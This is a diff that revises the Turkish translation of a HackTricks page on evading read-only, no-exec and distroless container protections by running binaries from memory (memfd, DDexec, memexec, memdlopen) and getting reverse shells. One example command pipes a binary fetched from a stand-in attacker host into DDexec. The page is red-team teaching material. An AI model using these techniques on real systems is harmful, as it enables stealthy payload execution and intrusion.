@@ -1,35 +1,36 @@
-# FS korumalarını atlatma: salt okunur / no-exec / Distroless
+# FS korumalarını aşma: yalnızca okunur / çalıştırma yok / Distroless
+
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Sıfırdan kahraman olacak şekilde AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
-* [**Resmi PEASS & HackTricks ürünleri**]'ni edinin (https://peass.creator-spring.com)
-* [**PEASS Ailesi**]'ni keşfedin (https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**]'in koleksiyonu
-* **Katılın** 💬 [**Discord grubumuza**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin**.
-* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi takip edin** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Hacking ipuçlarını paylaşın,** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Eğer **hacking kariyeri**ne ilgi duyuyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı Lehçe yazılı ve sözlü gereklidir_).
+Eğer **hacking kariyeri** ile ilgileniyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı Lehçe yazılı ve sözlü gereklidir_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 ## Videolar
 
-Aşağıdaki videolarda bu sayfada bahsedilen teknikleri daha detaylı açıklanmış şekilde bulabilirsiniz:
+Aşağıdaki videolarda bu sayfada bahsedilen teknikleri daha derinlemesine bulabilirsiniz:
 
-* [**DEF CON 31 - Gizlilik ve Kaçınma için Linux Bellek Manipülasyonu Keşfi**](https://www.youtube.com/watch?v=poHirez8jk4)
-* [**DDexec-ng ve bellek içi dlopen() ile Gizli sızıntılar - HackTricks Takip 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
+* [**DEF CON 31 - Linux Bellek Manipülasyonu ile Gizlilik ve Kaçış**](https://www.youtube.com/watch?v=poHirez8jk4)
+* [**DDexec-ng ile Gizli Sızmalar & Bellek İçi dlopen() - HackTricks Takip 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
 
-## salt okunur / no-exec senaryosu
+## yalnızca okunur / çalıştırma yok senaryosu
 
-Özellikle konteynerlerde **salt okunur (ro) dosya sistemi koruması** ile donatılmış Linux makineleri bulmak artık daha yaygın hale gelmektedir. Bu, salt okunur dosya sistemiyle bir konteyner çalıştırmak için `securitycontext` içinde **`readOnlyRootFilesystem: true`** ayarlamak kadar kolaydır:
+**Yalnızca okunur (ro) dosya sistemi koruması** ile monte edilmiş linux makineleri bulmak giderek daha yaygın hale geliyor, özellikle konteynerlerde. Bunun nedeni, ro dosya sistemi ile bir konteyner çalıştırmanın **`readOnlyRootFilesystem: true`** ayarını `securitycontext` içinde ayarlamak kadar kolay olmasıdır:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
@@ -44,103 +45,110 @@ securityContext:
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-Ancak, dosya sistemi salt okunur olarak bağlanmış olsa bile, **`/dev/shm`** hala yazılabilir olacaktır, bu nedenle diske bir şey yazamayacağımızı düşünmek yanıltıcıdır. Bununla birlikte, bu klasör **no-exec koruması ile bağlanacaktır**, bu nedenle buraya bir ikili dosya indirirseniz **onu çalıştıramayacaksınız**.
+Ancak, dosya sistemi ro olarak monte edilmiş olsa bile, **`/dev/shm`** hala yazılabilir olacak, bu yüzden diske hiçbir şey yazamayacağımız yalan. Ancak, bu klasör **çalıştırma yok koruması** ile monte edilecektir, bu nedenle burada bir ikili dosya indirirseniz **onu çalıştıramayacaksınız**.
 
 {% hint style="warning" %}
-Kırmızı takım bakış açısından, bu, sistemde zaten olmayan ikili dosyaları indirip çalıştırmayı **karmaşık hale getirir** (örneğin, `kubectl` gibi arka kapılar veya numaralandırıcılar).
+Kırmızı takım perspektifinden, bu, sistemde zaten olmayan ikili dosyaları **indirmeyi ve çalıştırmayı zorlaştırıyor** (örneğin arka kapılar veya `kubectl` gibi sayıcılar).
 {% endhint %}
 
-## En Kolay Atlatma: Betikler
+## En Kolay Aşma: Scriptler
 
-İkili dosyaları bahsettiğimi unutmayın, **yorumlayıcının** makinede olması koşuluyla herhangi bir betiği **çalıştırabilirsiniz**, örneğin `sh` yüklüyse bir **kabuk betiği** veya `python` yüklüyse bir **python betiği**.
+İkili dosyalardan bahsettiğimi unutmayın, eğer yorumlayıcı makine içinde mevcutsa, herhangi bir **scripti** çalıştırabilirsiniz, örneğin `sh` mevcutsa bir **shell scripti** veya `python` yüklüyse bir **python scripti**.
 
-Ancak, bu, ikili geri kapı veya çalıştırmanız gerekebilecek diğer ikili araçları çalıştırmak için yeterli değildir.
+Ancak, bu yalnızca ikili arka kapınızı veya çalıştırmanız gereken diğer ikili araçları çalıştırmak için yeterli değildir.
 
-## Bellek Atlatmaları
+## Bellek Aşmaları
 
-Bir ikili dosyayı çalıştırmak istiyorsanız ancak dosya sistemi buna izin vermiyorsa, bunu yapmanın en iyi yolu, **bellekten çalıştırmaktır**, çünkü **korumalar orada geçerli değildir**.
+Bir ikili dosyayı çalıştırmak istiyorsanız ancak dosya sistemi buna izin vermiyorsa, bunu **bellekten çalıştırarak** yapmak en iyi yoldur, çünkü **korumalar burada geçerli değildir**.
 
-### FD + exec sistem çağrısı atlatma
+### FD + exec syscall aşması
 
-Makinede **Python**, **Perl** veya **Ruby** gibi güçlü betik motorlarına sahipseniz, ikili dosyayı bellekten çalıştırmak için indirebilir, onu bir bellek dosya tanımlayıcısında saklayabilirsiniz (`create_memfd` sistem çağrısı), bu korumalar tarafından korunmayacak ve ardından bir **`exec` sistem çağrısı** yaparak **fd'yi çalıştırılacak dosya olarak belirtebilirsiniz**.
+Makine içinde bazı güçlü script motorlarına sahipseniz, örneğin **Python**, **Perl** veya **Ruby**, ikili dosyayı belleğe indirmek, bir bellek dosya tanımlayıcısında (`create_memfd` syscall) saklamak, bu korumalardan etkilenmeyecek ve ardından **`exec` syscall** çağrısı yaparak **çalıştırılacak dosya olarak fd'yi belirtmek** mümkündür.
 
-Bunun için kolayca [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) projesini kullanabilirsiniz. Bir ikili dosya iletebilir ve onu **b64 kodlanmış ve şifrelenmiş** bir şekilde içeren belirtilen dilde bir betik oluşturacak ve `create_memfd` sistem çağrısını çağırarak oluşturulan bir **fd** içinde **ikili dosyayı depolamak** ve onu çalıştırmak için **exec** sistem çağrısını çağıracaktır.
+Bunun için [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) projesini kolayca kullanabilirsiniz. Bir ikili dosya geçirebilir ve belirtilen dilde, **ikili dosya sıkıştırılmış ve b64 kodlanmış** olarak, **decode ve decompress** talimatları ile birlikte bir **fd** oluşturacak şekilde bir script üretecektir.
 
 {% hint style="warning" %}
-Bu, PHP veya Node gibi diğer betik dillerinde çalışmaz çünkü bunlar bir betikten **ham sistem çağrıları** yapmanın varsayılan bir yoluna sahip değillerdir, bu nedenle `create_memfd`'yi çağırmak için **bellek fd'si** oluşturmak mümkün değildir.
+Bu, PHP veya Node gibi diğer script dillerinde çalışmaz çünkü bunların scriptten ham syscall'leri çağırmanın herhangi bir **varsayılan yolu yoktur**, bu nedenle ikili dosyayı saklamak için **bellek fd** oluşturmak için `create_memfd` çağrısı yapmak mümkün değildir.
 
-Ayrıca, `/dev/shm` içinde bir dosya ile **düzenli bir fd** oluşturmak çalışmayacaktır, çünkü **no-exec koruması** uygulanacağından çalıştırmanıza izin verilmeyecektir.
+Ayrıca, `/dev/shm` içinde bir dosya ile **normal bir fd** oluşturmak işe yaramaz, çünkü **çalıştırma yok koruması** uygulanacağı için bunu çalıştırmanıza izin verilmeyecektir.
 {% endhint %}
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec), kendi işlemizin **`/proc/self/mem`**'ini üzerine yazarak işlemimizin belleğini **değiştirmenizi** sağlayan bir tekniktir.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) tekniği, kendi sürecinizin belleğini **`/proc/self/mem`** üzerinden yazma ile **değiştirmenizi** sağlar.
 
-Bu nedenle, işlem tarafından yürütülen **derleme kodunu kontrol ederek**, bir **shellcode** yazabilir ve işlemi **herhangi bir keyfi kodu çalıştırmak üzere "mutasyona uğratabilirsiniz**.
+Bu nedenle, sürecin yürüttüğü **assembly kodunu kontrol ederek**, bir **shellcode** yazabilir ve süreci "mutasyona uğratarak" **herhangi bir keyfi kodu çalıştırabilirsiniz**.
 
 {% hint style="success" %}
-**DDexec / EverythingExec**, kendi **shellcode**'unuzu veya **bellekten herhangi bir ikili dosyayı** yüklemenize ve **çalıştırmanıza** olanak tanır.
+**DDexec / EverythingExec**, kendi **shellcode** veya **herhangi bir ikili dosyayı** **bellekten** yükleyip **çalıştırmanıza** olanak tanır.
 {% endhint %}
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
+For more information about this technique check the Github or:
+
+{% content-ref url="ddexec.md" %}
+[ddexec.md](ddexec.md)
+{% endcontent-ref %}
+
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec), DDexec'in doğal bir sonraki adımıdır. Herhangi bir farklı ikili dosyayı çalıştırmak istediğinizde DDexec'i yeniden başlatmanıza gerek kalmaz, sadece memexec shellcode'unu DDexec tekniği aracılığıyla çalıştırabilir ve ardından bu deamon ile iletişim kurarak yeni ikili dosyaları yükleyip çalıştırabilirsiniz.
+[**Memexec**](https://github.com/arget13/memexec) DDexec'in doğal bir sonraki adımıdır. **Farklı bir ikili dosya çalıştırmak istediğinizde** DDexec'i yeniden başlatmanıza gerek yoktur, sadece memexec shellcode'u DDexec tekniği aracılığıyla çalıştırabilir ve ardından **yeni ikili dosyaları yüklemek ve çalıştırmak için bu demon ile iletişim kurabilirsiniz**.
 
-PHP ters kabuk kullanarak **memexec'i nasıl kullanacağınıza dair bir örnek** [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) adresinde bulunabilir.
+**Memexec'i bir PHP ters shell'den ikili dosyaları çalıştırmak için nasıl kullanacağınızla ilgili bir örneği** [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) adresinde bulabilirsiniz.
 
 ### Memdlopen
 
-DDexec'e benzer bir amaçla, [**memdlopen**](https://github.com/arget13/memdlopen) tekniği, daha sonra bunları çalıştırmak için belleğe ikili dosyaları yüklemenin daha kolay bir yolunu sağlar. Bağımlılıkları olan ikili dosyaları yüklemeyi bile mümkün kılabilir.
+DDexec ile benzer bir amaca sahip olan [**memdlopen**](https://github.com/arget13/memdlopen) tekniği, ikili dosyaları **hafızaya yüklemenin daha kolay bir yolunu** sağlar. Hatta bağımlılıkları olan ikili dosyaları yüklemeye bile izin verebilir.
 
-## Distroless Atlatma
+## Distroless Bypass
 
 ### Distroless nedir
 
-Distroless konteynerler, yalnızca belirli bir uygulamayı veya hizmeti çalıştırmak için gerekli olan en temel bileşenleri içerir; kütüphaneler ve çalışma zamanı bağımlılıkları gibi, ancak bir paket yöneticisi, kabuk veya sistem yardımcı programları gibi daha büyük bileşenleri hariç tutar.
+Distroless konteynerler yalnızca belirli bir uygulama veya hizmeti çalıştırmak için gerekli olan **en az bileşenleri** içerir, örneğin kütüphaneler ve çalışma zamanı bağımlılıkları, ancak paket yöneticisi, shell veya sistem yardımcı programları gibi daha büyük bileşenleri hariç tutar.
 
-Distroless konteynerlerin amacı, gereksiz bileşenleri ortadan kaldırarak konteynerlerin saldırı yüzeyini azaltmak ve sömürülebilecek güvenlik açıklarının sayısını en aza indirmektir.
+Distroless konteynerlerin amacı, **gereksiz bileşenleri ortadan kaldırarak konteynerlerin saldırı yüzeyini azaltmak** ve istismar edilebilecek zafiyet sayısını en aza indirmektir.
 
-### Ters Kabuk
+### Ters Shell
 
-Distroless konteynerlerde genellikle düzenli bir kabuk almak için `sh` veya `bash` bulamayabilirsiniz. Ayrıca, genellikle bir sistemde çalıştırdığınız `ls`, `whoami`, `id` gibi ikili dosyaları da bulamazsınız.
+Bir distroless konteynerde **normal bir shell almak için `sh` veya `bash`** bile bulamayabilirsiniz. Ayrıca `ls`, `whoami`, `id` gibi ikili dosyaları da bulamayacaksınız... genellikle bir sistemde çalıştırdığınız her şey.
 
 {% hint style="warning" %}
-Bu nedenle, genellikle sistemde yaptığınız gibi bir **ters kabuk** alamayacak veya sistemde **numaralandıramayacaksınız**.
+Bu nedenle, **ters shell** almanız veya sistemi **listelemeniz** mümkün **olmayacak**.
 {% endhint %}
 
-Ancak, ele geçirilen bir konteyner örneğinde flask web çalışıyorsa, o zaman python yüklüdür ve dolayısıyla bir **Python ters kabuk** alabilirsiniz. Node çalışıyorsa, bir Node ters kabuk alabilirsiniz ve aynı şekilde çoğu **betik dili** ile yapabilirsiniz.
+Ancak, eğer ele geçirilmiş konteyner örneğin bir flask web çalıştırıyorsa, o zaman python yüklüdür ve bu nedenle bir **Python ters shell** alabilirsiniz. Eğer node çalıştırıyorsa, bir Node rev shell alabilirsiniz ve çoğu **betik dili** için aynı durum geçerlidir.
 
 {% hint style="success" %}
-Betik dili kullanarak dilin yeteneklerini kullanarak sistemde **numaralandırabilirsiniz**.
+Betik dilini kullanarak **sistemi listeleyebilirsiniz**.
 {% endhint %}
 
-Eğer **`read-only/no-exec`** korumaları yoksa, ters kabuğunuzu kullanarak dosya sistemine **ikili dosyalarınızı yazabilir** ve **çalıştırabilirsiniz**.
+Eğer **`read-only/no-exec`** korumaları yoksa, ters shell'inizi kullanarak **dosya sistemine ikili dosyalarınızı yazabilir** ve **çalıştırabilirsiniz**.
 
 {% hint style="success" %}
-Ancak, bu tür konteynerlerde genellikle bu korumalar bulunacaktır, ancak bunları atlatmak için **önceki bellek yürütme tekniklerini kullanabilirsiniz**.
+Ancak, bu tür konteynerlerde bu korumalar genellikle mevcut olacaktır, ancak **önceki bellek yürütme tekniklerini kullanarak bunları aşabilirsiniz**.
 {% endhint %}
 
-**RCE zafiyetlerini kullanarak bazı betik dilleri ile ters kabuk almayı ve bellekten ikili dosyaları çalıştırmayı nasıl istismar edeceğinize dair örnekler** [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) adresinde bulunabilir.
+**Bazı RCE zafiyetlerini istismar ederek betik dillerinden ters shell'ler almak ve hafızadan ikili dosyaları çalıştırmak için nasıl yapılacağına dair örnekleri** [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) adresinde bulabilirsiniz.
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Eğer **hacking kariyeri** ile ilgileniyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı şekilde yazılı ve konuşulan Lehçe gereklidir_).
+Eğer **hack kariyeri** ile ilgileniyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı lehçe yazılı ve sözlü gereklidir_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'i desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek veya HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin.
-* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud** github depolarına PR'lar göndererek paylaşın.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** bizi **takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek hackleme ipuçlarını paylaşın.
 
 </details>
+{% endhint %}
